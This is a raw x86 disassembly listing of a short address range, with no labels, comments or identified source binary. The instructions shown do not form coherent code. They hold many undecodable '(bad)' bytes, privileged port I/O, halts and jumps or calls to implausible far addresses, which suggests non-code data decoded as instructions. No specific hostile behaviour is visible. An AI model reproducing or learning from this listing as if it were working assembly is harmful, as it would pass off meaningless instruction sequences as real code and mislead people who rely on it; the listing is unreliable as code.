  408cd2:	retf   0x203
  408cd5:	fadd   st,st(7)
  408cd7:	mov    bl,0xe5
  408cd9:	in     eax,0xbd
  408cdb:	ret    0xc8c4
  408cde:	mov    ch,0xb6
  408ce0:	mov    ebx,0x2cffad7
  408ce5:	mov    edi,0xfee0f7bc
  408cea:	fsubrp st(1),st
  408cec:	fcomi  st,st(4)
  408cee:	out    0xeb,al
  408cf0:	mov    ebp,0x5eafd08
  408cf5:	in     al,0xc7
  408cf7:	lods   al,BYTE PTR ds:[esi]
  408cf8:	ret    0xacb3
  408cfb:	fcmovnu st,st(2)
  408cfd:	lock fstp TBYTE PTR [ebx-0x9290b2d]
  408d04:	div    cl
  408d06:	out    dx,al
  408d07:	shl    edx,1
  408d09:	add    dh,ah
  408d0b:	add    edx,edx
  408d0d:	add    al,BYTE PTR [eax]
  408d0f:	(bad)  
  408d10:	hlt    
  408d11:	hlt    
  408d12:	jmp    0xcb238c23
  408d17:	scas   al,BYTE PTR es:[edi]
  408d18:	scas   al,BYTE PTR es:[edi]
  408d19:	scas   eax,DWORD PTR es:[edi]
  408d1a:	mov    ebp,0xe4f0c4b4
  408d1f:	out    0xd8,al
  408d21:	retf   0xe9fd
  408d24:	out    dx,eax
  408d25:	int3   
  408d26:	shl    ecx,cl
  408d28:	in     eax,dx
  408d29:	add    eax,0xd5c3f205
  408d2e:	hlt    
  408d2f:	or     ah,al
  408d31:	add    edi,ebp
  408d33:	aam    0xe8
  408d35:	fdivr  QWORD PTR [ebp+ebp*4-0x3f2b0a4e]
  408d3c:	mov    bh,0xfb
  408d3e:	mov    ebx,0xbff2c5e9
  408d43:	iret   
  408d44:	dec    esp
  408d46:	(bad)  
  408d48:	stc    
  408d49:	mov    DWORD PTR [edx],0xded4dbd2
  408d4f:	retf   
  408d50:	xlat   BYTE PTR ds:[ebx]
  408d51:	cli    
  408d52:	(bad)  
  408d53:	fcmovne st,st(6)
  408d55:	adc    eax,ebp
  408d57:	fadd   st(4),st
  408d59:	out    dx,al
  408d5a:	jmp    0xc201534b
  408d5f:	stc    
  408d60:	call   0x33a772b
  408d65:	(bad)  
  408d67:	add    ch,dl
  408d69:	shl    ecx,0xd7
  408d6c:	aam    0x3
  408d6e:	ret    
  408d6f:	ror    BYTE PTR [ecx],1
  408d71:	out    0xd4,al
  408d73:	(bad)  
  408d75:	int3   
  408d76:	repz out dx,eax
  408d78:	jmp    0xd42f534e
  408d7d:	rcl    edx,1
  408d7f:	out    dx,eax
  408d80:	in     eax,dx
  408d81:	jmp    0xd3dc:0xf4e3eccc
  408d88:	ret    0x5e6
  408d8b:	(bad)  
  408d8c:	jmp    0x408d77
  408d8e:	std    
  408d8f:	(bad)  
  408d91:	push   es
  408d92:	(bad)  
  408d94:	add    eax,DWORD PTR [esi]
  408d96:	(bad)  
  408d97:	in     eax,0xa8
  408d99:	mov    dl,0xab
  408d9b:	repnz mov ch,0xfa
  408d9e:	out    dx,al
  408d9f:	(bad)  
  408da0:	div    BYTE PTR [ebp+eiz*8-0x102c070f]
  408da7:	cld    
  408da8:	repz call ecx
  408dab:	add    al,0xfb
  408dad:	clc    
  408dae:	(bad)  
  408daf:	out    dx,eax
  408db0:	mov    ebp,0x7ededd8
  408db5:	or     esi,ecx
  408db7:	mov    ebp,0xced4cabc
  408dbc:	shl    esp,0xfb
  408dbf:	(bad)  
  408dc1:	push   ecx
  408dc3:	fdivr  DWORD PTR [ebx-0x3203224c]
  408dc9:	fcos   
  408dcb:	in     al,dx
  408dcc:	fdivrp st(0),st
  408dce:	in     eax,0xca
  408dd0:	ror    DWORD PTR ds:0xe701ce,0xd1
  408dd7:	lock rcl al,cl
  408dda:	hlt    
  408ddb:	mov    esp,0xf5c7d7ad
  408de0:	mov    ch,0xfb
  408de2:	into   
  408de3:	out    dx,eax
  408de4:	icebp  
  408de5:	clc    
  408de6:	sar    DWORD PTR [ebx+edx*8-0x22081224],1
  408ded:	add    esi,edi
  408def:	(bad)  
  408df1:	out    dx,eax
  408df2:	fadd   DWORD PTR ds:0xd8aa06fb
  408df8:	retf   0xd1e9
  408dfb:	mov    esp,0xd4efe4e2
  408e00:	(bad)  
  408e01:	aam    0xff
  408e03:	fincstp 
  408e05:	ret    0xf0f0
  408e08:	aad    0xfd
  408e0a:	(bad)  
  408e0c:	in     eax,0xf9
  408e0e:	or     al,ah
  408e10:	clc    
  408e11:	jecxz  0x408dfc
  408e13:	add    ch,bl
  408e15:	pop    es
  408e16:	out    0xaa,eax
  408e18:	mov    edi,0xcbf0acdd
  408e1d:	jmp    0xd4b3:0xd9ffc7b7
  408e24:	enter  0xbbd9,0xff
  408e28:	clc    
  408e29:	aam    0xdf
  408e2b:	div    bl
  408e2d:	aam    0xd6
  408e2f:	add    ch,al
  408e31:	into   
  408e32:	add    ah,dl
  408e34:	(bad)  
  408e36:	fadd   st(5),st
  408e38:	out    dx,eax
  408e39:	(bad)
  408e3c:	test   eax,0xe4efb4ec
  408e41:	rol    ebp,1
  408e43:	retf   0xddf9
  408e46:	add    al,bl
  408e48:	in     al,dx
  408e49:	add    al,bl
  408e4b:	add    esp,esi
  408e4d:	(bad)  
  408e4e:	fdivp  st(2),st
  408e50:	add    al,al
  408e52:	or     eax,ebx
  408e54:	cli    
  408e55:	fisubr WORD PTR [edi-0x935342e]
  408e5b:	retf   0xd0cc
  408e5e:	into   
  408e5f:	shl    esp,1
  408e61:	hlt    
  408e62:	ror    esi,1
  408e64:	cmc    
  408e65:	mov    ecx,0xcefdf4d9
  408e6a:	inc    ebx
  408e6c:	test   edx,0xe4e1f8e3
  408e72:	enter  0xebc9,0xec
  408e76:	lods   eax,DWORD PTR ds:[esi]
  408e77:	test   eax,0xe1e5f7ac
  408e7c:	mov    bl,0xeb
  408e7e:	sti    
  408e7f:	mov    ebx,0xe4b7d3b1
  408e84:	jmp    0xf1fe6844
  408e89:	aad    0xc3
  408e8b:	(bad)  
  408e8c:	mov    esp,0xf7e3f1e1
  408e91:	add    ecx,DWORD PTR [edi]
  408e93:	or     cl,cl
  408e95:	adc    esp,DWORD PTR [edi-0x434d5a2d]
  408e9b:	mov    al,0xed
  408e9d:	out    0xeb,al
  408e9f:	mov    al,0xe5
  408ea1:	cmc    
  408ea2:	fucomp st(2)
  408ea4:	fcmovne st,st(4)
  408ea6:	int    0x0
  408ea8:	repz in al,dx
  408eaa:	imul   ah
  408eac:	hlt    
  408ead:	sti    
  408eae:	fst    st(0)
  408eb0:	inc    ch
  408eb2:	add    eax,0xefefff06
  408eb7:	test   al,0xcf
  408eb9:	bnd jmp 0xf82b70a1
  408ebf:	rcr    dl,0xde
  408ec2:	int    0xbd
  408ec4:	mov    eax,0xccc0e1e9
  408ec9:	loopne 0x408e9b
  408ecb:	std    
  408ecc:	icebp  
  408ecd:	repnz loopne 0x408e9b
  408ed0:	in     eax,0xe0
  408ed2:	in     al,dx
  408ed3:	jmp    0xe5e9:0xebca0ace
  408eda:	lock int3 
  408edc:	out    0xfa,eax
  408ede:	shl    dh,cl
  408ee0:	stc    
  408ee1:	mov    bh,0xfe
  408ee3:	aam    0xf8
  408ee5:	shr    ebp,cl
  408ee7:	out    dx,al
  408ee8:	ret    
  408ee9:	icebp  
  408eea:	aad    0xd0
  408eec:	loope  0x408ed3
  408eee:	jmp    0x408ef1
  408ef0:	enter  0xf8d4,0xd8
  408ef4:	enter  0xee0e,0xcb
  408ef8:	in     eax,dx
  408ef9:	jmp    0x408ec6
  408efb:	loopne 0x408ed7
  408efd:	mov    bh,0xf5
  408eff:	repnz (bad) 
  408f01:	(bad)
  408f04:	fstp   TBYTE PTR [edx-0x2c030ffd]
  408f0a:	aad    0xd6
  408f0c:	aam    0xd4
  408f0e:	out    0x7,al
  408f10:	(bad)  
  408f12:	(bad)  
  408f14:	enter  0xbcf3,0xad
  408f18:	icebp  
  408f19:	iret   
  408f1a:	retf   
  408f1b:	jmp    0x408ed4
  408f1d:	test   al,0xe4
  408f1f:	xlat   BYTE PTR ds:[ebx]
  408f20:	(bad)  
  408f21:	fadd   st,st(4)
  408f23:	in     al,dx
  408f24:	(bad)  
  408f26:	jmp    0xd121611b
  408f2b:	in     al,0xdb
  408f2d:	fucomip st,st(1)
  408f2f:	cmc    
  408f30:	or     ah,dl
  408f32:	in     al,dx
  408f33:	or     eax,0xe6d3c4ec
  408f38:	mov    dl,0xb3
  408f3a:	(bad)
  408f3d:	mov    ah,0xf7
  408f3f:	stc    
  408f40:	hlt    
  408f41:	idiv   ecx
  408f43:	fcmovne st,st(2)
  408f45:	jmp    0xd1fa:0xd2eeccd2
  408f4c:	std    
  408f4d:	add    al,0xbf
  408f4f:	std    
  408f50:	pop    es
  408f51:	fild   WORD PTR [ebx]
  408f53:	add    al,0xc5
  408f55:	jecxz  0x408f08
  408f57:	lods   eax,DWORD PTR ds:[esi]
  408f58:	repnz (bad) 
  408f5a:	rcl    esp,cl
  408f5c:	in     eax,dx
  408f5d:	cmc    
  408f5e:	hlt    
  408f5f:	fcmovbe st,st(6)
  408f61:	fcmovu st,st(6)
  408f63:	call   0xd031633e
  408f68:	xlat   BYTE PTR ds:[ebx]
  408f69:	loopne 0x408f6c
  408f6b:	add    al,dh
  408f6d:	jmp    0xdfd8:0x3c9ffd1
  408f74:	cld    
  408f75:	loopne 0x408f25
  408f77:	mov    al,0xd3
  408f79:	mov    dl,0xd6
  408f7b:	mov    ah,0xe7
  408f7d:	out    0xb7,al
  408f7f:	jmp    0x408f4f
  408f81:	repnz fucomi st,st(0)
  408f84:	(bad)  
  408f86:	mov    esi,0xd6fab5fb
  408f8b:	pop    es
  408f8c:	add    al,0xdc
  408f8e:	loopne 0x408f75
  408f90:	jmp    0xd2cd:0xdbcfd5e8
  408f97:	mov    esp,0xcfeacbc3
  408f9c:	out    0xef,eax
  408f9e:	mov    ah,0xd6
  408fa0:	repnz fidivr WORD PTR [edi-0x411cfc0a]
  408fa7:	rcl    esi,0xdb
  408faa:	ret    
  408fab:	cli    
  408fac:	std    
  408fad:	or     esp,ebx
  408faf:	retf   0xca0b
  408fb2:	jmp    0xd1dd:0xa702e5d8
  408fb9:	lods   eax,DWORD PTR ds:[esi]
  408fba:	lods   eax,DWORD PTR ds:[esi]
  408fbb:	loopne 0x408fad
  408fbd:	(bad)  
  408fbf:	mov    dh,0xf0
  408fc1:	icebp  
  408fc2:	in     eax,0xf8
  408fc4:	add    edi,DWORD PTR [edi-0x123d230d]
  408fca:	rol    BYTE PTR [edx],cl
  408fcc:	or     ecx,DWORD PTR [ecx]
  408fce:	hlt    
  408fcf:	hlt    
  408fd0:	jmp    0xee0b549a
  408fd5:	(bad)  
  408fd6:	fidivr WORD PTR [esi-0x19502239]
  408fdc:	call   0xdf3588bc
  408fe1:	in     eax,dx
  408fe2:	neg    al
  408fe4:	fdivr  st(4),st
  408fe6:	fcmovbe st,st(5)
  408fe8:	rcr    esi,cl
  408fea:	add    eax,0xbd5fcde
  408fef:	les    eax,FWORD PTR [edi]
  408ff1:	add    al,0xc
  408ff3:	paddd  mm2,QWORD PTR [ebx]
  408ff6:	retf   
  408ff7:	out    dx,al
  408ff8:	fsubr  st(7),st
  408ffa:	imul   BYTE PTR [ebp-0x3b092b16]
  409000:	neg    bl
  409002:	in     eax,0xcc
  409004:	iret   
  409005:	mov    eax,0xfdfab6c3
  40900a:	vpaddd ymm6,ymm5,ymm4
  40900e:	inc    dl
  409010:	loope  0x40900c
  409012:	loope  0x408ff0
  409014:	(bad)  
  409015:	retf   
  409016:	retf   0xcde8
  409019:	(bad)  
  40901b:	call   0xcb3280ef
  409020:	mov    al,0xc6
  409022:	mov    esi,0xf9dad9f9
  409027:	add    esi,esp
  409029:	in     al,dx
  40902a:	shl    ah,cl
  40902c:	or     ah,ch
  40902e:	hlt    
  40902f:	out    0xca,al
  409031:	or     BYTE PTR [ebx],al
  409033:	push   es
  409034:	(bad)
  409037:	mov    ebp,0xb7addeed
  40903c:	mov    cl,0xf3
  40903e:	retf   0xcdd1
  409041:	out    0xdd,al
  409043:	fidivr WORD PTR [ebp-0x312b3244]
  409049:	add    eax,0xe0d4facd
  40904e:	cmc    
  40904f:	(bad)  
  409050:	mov    DWORD PTR [esi],0xbecc6d5
  409056:	icebp  
  409057:	les    ebp,FWORD PTR [ebp-0x3423323e]
  40905d:	imul   edx
  40905f:	iret   
  409060:	aad    0xda
  409062:	mov    ah,0xde
  409064:	sti    
  409065:	mov    edx,0xbdf6dec8
  40906a:	sti    
  40906b:	ret    
  40906c:	fadd   st,st(6)
  40906e:	(bad)  
  40906f:	sti    
  409070:	mov    DWORD PTR [edi],0xede205ce
  409076:	retf   
  409077:	out    dx,eax
  409078:	jecxz  0x40902c
  40907a:	mov    ch,0xe2
  40907c:	mov    al,0xd7
  40907e:	sar    eax,cl
  409080:	aad    0xe4
  409082:	fnstsw WORD PTR [ebx-0x12320a25]
  409088:	clc    
  409089:	aam    0xfd
  40908b:	mov    ebp,0xd4c9d5c3
  409090:	xlat   BYTE PTR ds:[ebx]
  409091:	jmp    0x409075
  409093:	std    
  409094:	or     DWORD PTR [ecx],edx
  409096:	loop   0x409040
  409098:	fild   QWORD PTR [ebp-0x26083d18]
  40909e:	aam    0xf4
  4090a0:	cli    
  4090a1:	hlt    
  4090a2:	fcmovnbe st,st(2)
  4090a4:	aad    0xbb
  4090a6:	add    edi,ebp
  4090a8:	add    DWORD PTR [edx],eax
  4090aa:	cmc    
  4090ab:	ret    
  4090ac:	out    0xc6,al
  4090ae:	dec    DWORD PTR [edi]
  4090b0:	ror    DWORD PTR [ebx],0xc9
  4090b3:	loopne 0x40909b
  4090b5:	retf   
  4090b6:	retf   0xe5cd
  4090b9:	mov    esp,0xf1b1cce2
  4090be:	retf   
  4090bf:	ror    dh,1
  4090c1:	lock aam 0xd4
  4090c4:	in     al,dx
  4090c5:	out    dx,eax
  4090c6:	iret   
  4090c7:	mov    ebp,0xd7f5ddd9
  4090cc:	repnz jmp 0xcfea:0xe8c7d9dd
  4090d4:	in     eax,0xde
  4090d6:	(bad)  
  4090d8:	int3   
  4090d9:	xlat   BYTE PTR ds:[ebx]
  4090da:	int    0xb4
  4090dc:	lock (bad) 
  4090de:	fstp   TBYTE PTR [ebx-0x4705094a]
  4090e4:	not    edi
  4090e6:	shl    edx,1
  4090e8:	sar    bl,1
  4090ea:	inc    ah
  4090ec:	rol    al,1
  4090ee:	(bad)  
  4090ef:	aam    0x0
  4090f1:	hlt    
  4090f2:	(bad)  
  4090f3:	push   cs
  4090f4:	ror    DWORD PTR [edx+esi*4],0xb2
  4090f8:	mov    al,0xec
  4090fa:	retf   
  4090fb:	mov    dl,0xb5
  4090fd:	in     al,dx
  4090fe:	aam    0xd7
  409100:	(bad)  
  409102:	fnop   
  409104:	leave  
  409105:	int    0xbc
  409107:	mov    dh,0xd3
  409109:	mov    eax,0xcbd107fe
  40910e:	retf   0xde06
  409111:	add    eax,0xece901fe
  409116:	out    dx,eax
  409117:	shl    ecx,cl
  409119:	ret    0xf0f4
  40911c:	ret    
  40911d:	mov    cl,0xb5
  40911f:	mov    ah,0xb4
  409121:	retf   
  409122:	(bad)  
  409124:	jmp    0x7218e06
  409129:	shl    dl,1
  40912b:	aam    0xe0
  40912d:	fdivrp st(0),st
  40912f:	(bad)  
  409131:	fldz   
  409133:	jecxz  0x409117
  409135:	repnz shr bl,cl
  409138:	mul    al
  40913a:	out    0xb2,al
  40913c:	sar    DWORD PTR [ebx-0x1b13320e],1
  409142:	aam    0xe9
  409144:	fcmovnbe st,st(2)
  409146:	loop   0x409130
  409148:	fmulp  st(6),st
  40914a:	(bad)  
  40914b:	fild   WORD PTR [ecx]
  40914d:	cmc    
  40914e:	aam    0xc1
  409150:	jmp    ebp
  409152:	out    dx,al
  409153:	(bad)  
  409154:	loop   0x409161
  409156:	retf   0xf3eb
  409159:	fsubr  st(4),st
  40915b:	lock fcmovb st,st(4)
  40915e:	mov    ebx,0xccd5adfb
  409163:	enter  0xf1c3,0xef
  409167:	ret    0xf8cc
  40916a:	aad    0xf2
  40916c:	mov    BYTE PTR [edi+edi*4],0xc5
  409170:	retf   0xef02
  409173:	add    bl,al
  409175:	out    dx,al
  409176:	loope  0x409157
  409178:	in     eax,dx
  409179:	iret   
  40917a:	lods   al,BYTE PTR ds:[esi]
  40917b:	(bad)  
  40917c:	mov    dl,0xec
  40917e:	mul    esi
  409180:	iret   
  409181:	(bad)  
  409183:	repnz leave 
  409185:	jecxz  0x409141
  409187:	fst    st(5)
  409189:	jecxz  0x409167
  40918b:	add    DWORD PTR [ebx],ecx
  40918d:	in     al,0xff
  40918f:	(bad)  
  409190:	fucomip st,st(2)
  409192:	pandn  mm5,mm3
  409195:	int3   
  409196:	(bad)  
  409197:	out    0xc7,eax
  409199:	(bad)  
  40919a:	iret   
  40919b:	loopne 0x409182
  40919d:	aam    0xc7
  40919f:	jmp    0x409173
  4091a1:	jmp    0x40918f
  4091a3:	add    esi,ecx
  4091a5:	(bad)  
  4091a7:	sti    
  4091a8:	cld    
  4091a9:	pop    es
  4091aa:	int    0xe4
  4091ac:	(bad)  
  4091ae:	(bad)  
  4091af:	jmp    ebp
  4091b1:	ffree  st(6)
  4091b3:	clc    
  4091b4:	pop    es
  4091b5:	adc    DWORD PTR [ebp-0x42155a23],ebp
  4091bb:	(bad)
  4091be:	loope  0x40919a
  4091c0:	mov    edi,0xc8f3d0d5
  4091c5:	repz test ecx,0xf1bef607
  4091cc:	or     dl,bh
  4091ce:	in     al,0xc8
  4091d0:	(bad)  
  4091d1:	clc    
  4091d2:	add    al,0x6
  4091d4:	loop   0x4091c5
  4091d6:	out    0xb0,eax
  4091d8:	mov    al,0xc2
  4091da:	in     al,0xf7
  4091dc:	ret    0xf1e1
  4091df:	div    BYTE PTR [esi-0xc021448]
  4091e5:	ret    0xb9fd
  4091e8:	sti    
  4091e9:	fsub   st,st(1)
  4091eb:	push   es
  4091ec:	icebp  
  4091ed:	add    eax,0x5c0caf8
  4091f2:	add    esp,eax
  4091f4:	call   0xc5307bdb
  4091f9:	lods   al,BYTE PTR ds:[esi]
  4091fa:	rcr    ah,cl
  4091fc:	out    dx,eax
  4091fd:	(bad)  
  4091fe:	mov    bh,0xdf
  409200:	out    dx,al
  409201:	mov    ch,0xea
  409203:	mov    ebx,0xf6dcbdb8
  409208:	icebp  
  409209:	icebp  
  40920a:	cli    
  40920b:	fcomi  st,st(6)
  40920d:	push   es
  40920e:	ret    
  40920f:	call   0x2e8df8
  409214:	cli    
  409215:	std    
  409216:	mov    edi,0xb3f1cecd
  40921b:	lock cli 
  40921d:	(bad)  
  40921e:	aad    0xfb
  409220:	fcmove st,st(7)
  409222:	std    
  409223:	retf   0xe2b4
  409226:	mov    edx,0xbedcddf5
  40922b:	std    
  40922c:	fimul  DWORD PTR [edx]
  40922e:	retf   
  40922f:	out    dx,eax
  409230:	out    dx,al
  409231:	add    al,dh
  409233:	adc    eax,DWORD PTR [esi]
  409235:	adc    al,ch
  409237:	out    dx,eax
  409238:	call   0xdaed5f04
  40923d:	out    dx,al
  40923e:	repz cli 
  409240:	not    ch
  409242:	clc    
  409243:	ror    dh,1
  409245:	mov    esi,0xbee3fcd1
  40924a:	bnd ret 0xe1f4
  40924e:	or     ebp,edi
  409250:	mov    ebp,0x5c2d8c6
  409255:	add    cl,bl
  409257:	jecxz  0x409221
  409259:	lods   eax,DWORD PTR ds:[esi]
  40925a:	jecxz  0x40922f
  40925c:	jmp    0x409239
  40925e:	xlat   BYTE PTR ds:[ebx]
  40925f:	cli    
  409260:	out    dx,eax
  409261:	fcomp  st(7)
  409263:	stc    
  409264:	mov    edi,0xc1ce02dc
  409269:	into   
  40926a:	neg    esp
  40926c:	(bad)  
  40926e:	or     ah,bl
  409270:	jecxz  0x40925c
  409272:	in     eax,0xde
  409274:	fild   WORD PTR ds:0xeacaaacf
  40927a:	lock in eax,0xf1
  40927d:	aad    0xf0
  40927f:	test   ecx,0xedf9eac6
  409285:	mov    eax,0xf4bff8c1
  40928a:	add    bh,bl
  40928c:	cli    
  40928d:	stc    
  40928e:	std    
  40928f:	(bad)  
  409292:	fstp   st(5)
  409294:	call   0xbcef867a
  409299:	(bad)  
  40929a:	cmc    
  40929b:	aad    0xf7
  40929d:	aam    0xbb
  40929f:	les    esi,FWORD PTR [edi-0x22213345]
  4092a5:	(bad)  
  4092a6:	out    dx,al
  4092a7:	loop   0x4092ab
  4092a9:	hlt    
  4092aa:	(bad)  
  4092ac:	jecxz  0x4092b2
  4092ae:	add    al,0xe7
  4092b0:	add    bl,cl
  4092b2:	loopne 0x4092a1
  4092b4:	call   0xae0b799e
  4092b9:	(bad)  
  4092bb:	int    0xb1
  4092bd:	jmp    0xe4fc:0xb9efb2f1
  4092c4:	clc    
  4092c5:	lock fdiv st,st(4)
  4092c8:	ret    
  4092c9:	add    eax,0xf9fcfae5
  4092ce:	loope  0x409290
  4092d0:	jmp    0x4092c1
  4092d2:	fiadd  WORD PTR [esi]
  4092d4:	stc    
  4092d5:	fsubr  st(7),st
  4092d7:	test   eax,0xebecf1ed
  4092dc:	fcmovnb st,st(6)
  4092de:	shr    ebp,1
  4092e0:	into   
  4092e1:	into   
  4092e2:	icebp  
  4092e3:	leave  
  4092e4:	mov    ecx,0x2bcd8fe
  4092e9:	rcr    ebp,cl
  4092eb:	sar    bh,0x7
  4092ee:	fsubr  st,st(2)
  4092f0:	shr    al,0xe2
  4092f3:	enter  0xc8cd,0xed
  4092f7:	retf   0xe7eb
  4092fa:	retf   0xb5b4
  4092fd:	stc    
  4092fe:	repnz sti 
  409300:	int3   
  409301:	mov    eax,0xfab5b9eb
  409306:	ret    
  409307:	fiadd  WORD PTR [ebx]
  409309:	shl    esp,0x6
  40930c:	retf   
  40930d:	repnz inc edx
  409310:	out    0x9,eax
  409312:	or     eax,0xa70e0efe
  409317:	into   
  409318:	(bad)  
  409319:	loopne 0x40930c
  40931b:	out    0xac,al
  40931d:	mov    ch,0xb2
  40931f:	mov    dh,0xf5
  409321:	mov    ch,0xcb
  409323:	mov    eax,0xf7f8e9d4
  409328:	mov    ebp,0xe7d605fd
  40932d:	aam    0xdb
  40932f:	jecxz  0x409317
  409331:	aam    0xd5
  409333:	clc    
  409334:	into   
  409335:	in     al,dx
  409336:	mov    esp,0xb0f6e7c3
  40933b:	shr    ch,cl
  40933d:	lods   al,BYTE PTR ds:[esi]
  40933e:	in     eax,dx
  40933f:	retf   
  409340:	lods   eax,DWORD PTR ds:[esi]
  409341:	retf   0xfad1
  409344:	dec    ch
  409346:	fnstsw ax
  409348:	push   es
  409349:	sar    bl,1
  40934b:	jecxz  0x409318
  40934d:	icebp  
  40934e:	loope  0x409331
  409350:	test   esp,0xf2f8dac9
  409356:	fsubr  st(0),st
  409358:	mov    bh,0xca
  40935a:	into   
  40935b:	mov    bh,0xf5
  40935d:	mov    bl,0xcc
  40935f:	fcomp  st(2)
  409361:	int3   
  409362:	mov    esi,0xf4bac3d0
  409367:	std    
  409368:	int3   
  409369:	out    0xd2,al
  40936b:	or     eax,eax
  40936d:	cli    
  40936e:	or     eax,ebx
  409370:	jecxz  0x409341
  409372:	inc    dl
  409374:	pop    es
  409375:	in     eax,dx
  409376:	fucomp st(1)
  409378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409379:	retf   
  40937a:	(bad)  
  40937b:	rcr    edx,1
  40937d:	cli    
  40937e:	into   
  40937f:	out    0xf0,eax
  409381:	mov    edi,0xf8edf4e4
  409386:	loopne 0x409382
  409388:	cld    
  409389:	(bad)  
  40938a:	in     al,dx
  40938b:	add    ebp,edi
  40938d:	not    ecx
  40938f:	(bad)  
  409390:	aam    0xe2
  409392:	cli    
  409393:	(bad)  
  409394:	in     eax,dx
  409395:	iret   
  409396:	mov    edi,0xcbd1f0be
  40939b:	aad    0xb1
  40939d:	loop   0x409351
  40939f:	enter  0xb7e6,0xbd
  4093a3:	mov    dl,0xef
  4093a5:	rcr    al,cl
  4093a7:	mov    dh,0x7
  4093a9:	std    
  4093aa:	in     al,0x4
  4093ac:	(bad)
  4093af:	out    0xe6,al
  4093b1:	(bad)  
  4093b3:	in     eax,0xcc
  4093b5:	or     ah,ch
  4093b7:	jmp    0xb6e3:0xc9d4ced6
  4093be:	in     al,0xb1
  4093c0:	bnd jmp 0xef3e8bb8
  4093c6:	fdivp  st(0),st
  4093c8:	rcr    ecx,1
  4093ca:	add    dl,ah
  4093cc:	fild   DWORD PTR [edi]
  4093ce:	icebp  
  4093cf:	pmaddwd mm0,mm4
  4093d2:	cmc    
  4093d3:	(bad)
  4093d6:	retf   
  4093d7:	fmulp  st(1),st
  4093d9:	mov    dh,0xc1
  4093db:	hlt    
  4093dc:	mov    dh,0xc7
  4093de:	stc    
  4093df:	clc    
  4093e0:	(bad)  
  4093e1:	in     eax,dx
  4093e2:	shr    esp,1
  4093e4:	clc    
  4093e5:	add    DWORD PTR [edi-0x25390c03],edi
  4093eb:	int3   
  4093ec:	xlat   BYTE PTR ds:[ebx]
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	shr    ebx,0xee
  4093f1:	add    eax,0xe90700e7
  4093f6:	fadd   st(1),st
  4093f8:	ret    0xb5cf
  4093fb:	hlt    
  4093fc:	shl    cl,cl
  4093fe:	shl    bh,0xbb
  409401:	mul    esp
  409403:	hlt    
  409404:	(bad)  
  409405:	in     al,dx
  409406:	in     al,dx
  409407:	rol    DWORD PTR [ebx],0xfc
  40940a:	push   es
  40940b:	mov    edx,0x20a04fa
  409410:	fcomp  st(0)
  409412:	add    eax,0xb3d902fc
  409417:	rol    ch,0xe3
  40941a:	loop   0x4093d8
  40941c:	out    0xb0,eax
  40941e:	stc    
  40941f:	(bad)  
  409420:	mov    ecx,0xf1e8dcb5
  409425:	int3   
  409426:	fdivr  st,st(7)
  409428:	sti    
  409429:	sar    ch,1
  40942b:	loop   0x409424
  40942d:	ffree  st(7)
  40942f:	in     al,0xf8
  409431:	loope  0x409442
  409433:	(bad)  
  409434:	jmp    0xc406534c
  409439:	aad    0xd2
  40943b:	jecxz  0x4093e6
  40943d:	fcmovb st,st(4)
  40943f:	int    0xd7
  409441:	leave  
  409442:	out    dx,al
  409443:	iret   
  409444:	cld    
  409445:	mov    edi,0xf3f9e3fc
  40944a:	loopne 0x409438
  40944c:	or     esp,esp
  40944e:	lock hlt 
  409450:	in     al,0xca
  409452:	fiadd  DWORD PTR [esi]
  409454:	cli    
  409455:	call   0xe207510c
  40945a:	cmc    
  40945b:	out    0xc2,al
  40945d:	shl    dl,1
  40945f:	mov    bh,0xd5
  409461:	lods   al,BYTE PTR ds:[esi]
  409462:	call   0xcf146058
  409467:	sar    esi,0x7
  40946a:	in     al,dx
  40946b:	out    0xc1,al
  40946d:	hlt    
  40946e:	std    
  40946f:	out    0xc0,al
  409471:	push   es
  409472:	iret   
  409473:	fcmovu st,st(4)
  409475:	loop   0x409462
  409477:	fmul   st(5),st
  409479:	ror    ah,cl
  40947b:	int3   
  40947c:	mov    bh,0xf9
  40947e:	retf   0xb4fb
  409481:	mov    edx,0xfbd4bbe4
  409486:	mov    eax,0xfcf5d4
  40948b:	mov    ebp,0xc4fee7e6
  409490:	push   cs
  409491:	loop   0x40949b
  409493:	pop    es
  409494:	or     eax,DWORD PTR [esi]
  409496:	ret    0xb7cc
  409499:	into   
  40949a:	mov    dh,0xd6
  40949c:	rcl    edi,cl
  40949e:	lock retf 
  4094a0:	lock int 0xc5
  4094a3:	in     al,0x3
  4094a5:	sar    DWORD PTR [edx-0x1d0b412b],1
  4094ab:	add    al,0xe4
  4094ad:	out    0xfe,eax
  4094af:	clc    
  4094b0:	jmp    0xe5e2:0xe3ccf8e2
  4094b7:	out    dx,al
  4094b8:	jmp    0x40949c
  4094ba:	mov    al,0xc4
  4094bc:	iret   
  4094bd:	xlat   BYTE PTR ds:[ebx]
  4094be:	leave  
  4094bf:	mov    ah,0xcf
  4094c1:	rcr    esp,1
  4094c3:	clc    
  4094c4:	out    dx,eax
  4094c5:	jecxz  0x4094b8
  4094c7:	add    BYTE PTR [ebx],al
  4094c9:	(bad)  
  4094ca:	idiv   BYTE PTR [edx-0x1b023bf5]
  4094d0:	or     esp,esp
  4094d2:	mov    dl,0xb
  4094d5:	add    al,0xc3
  4094d7:	mov    edi,0xf0e8bcc8
  4094dc:	in     eax,0xe9
  4094de:	(bad)
  4094e1:	out    dx,al
  4094e2:	hlt    
  4094e3:	mov    ch,0xf1
  4094e5:	inc    DWORD PTR [eax]
  4094e7:	ret    0xd501
  4094ea:	add    al,0xcc
  4094ec:	fiadd  WORD PTR [ebx]
  4094ee:	out    0xf,al
  4094f0:	(bad)  
  4094f2:	loopne 0x4094d1
  4094f4:	or     BYTE PTR [esi+eax*8],cl
  4094f7:	mov    al,0xc8
  4094f9:	shl    ebp,1
  4094fb:	mov    ch,0xcb
  4094fd:	rcl    ah,cl
  4094ff:	(bad)  
  409500:	mul    esp
  409502:	leave  
  409503:	sti    
  409504:	enter  0xd6b9,0xf1
  409508:	fdivr  st(1),st
  40950a:	std    
  40950b:	pop    es
  40950c:	std    
  40950d:	jmp    0xdc0f:0x1c8e1c3
  409514:	(bad)
  409517:	mov    eax,0xf6cebde4
  40951c:	retf   
  40951d:	cmc    
  40951e:	div    ah
  409520:	fxch   st(4)
  409522:	fucomi st,st(4)
  409524:	retf   
  409525:	into   
  409526:	out    dx,eax
  409527:	shl    ecx,0xbe
  40952a:	hlt    
  40952b:	xlat   BYTE PTR ds:[ebx]
  40952c:	repz not ch
  40952f:	or     edi,ebp
  409531:	jmp    0xc0c2:0xfae8dd08
  409538:	lods   al,BYTE PTR ds:[esi]
  409539:	jecxz  0x409509
  40953b:	(bad)
